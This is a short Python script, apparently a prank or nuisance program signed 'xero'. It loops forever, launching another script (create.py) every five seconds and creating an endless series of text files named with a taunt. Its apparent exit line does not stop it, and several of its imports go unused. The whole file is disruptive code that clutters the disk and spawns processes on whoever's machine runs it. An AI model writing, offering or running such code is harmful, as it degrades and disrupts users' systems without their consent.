import os, time
import pyautogui as pya
import webbrowser as wb
import tkinter as tk
import ctypes
import random
def main():
    n = random.randint(1, 10000000)
    n2 = 1
    while True:
        n+=1
        n2+=1
        time.sleep(5)
        os.startfile("create.py")
        print(f"XERO FILE {n}")
        if n2 == 10:
            os.system("exit")
        f = open(f"xero on top hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha {n}.txt", "x")
while True:
    main()
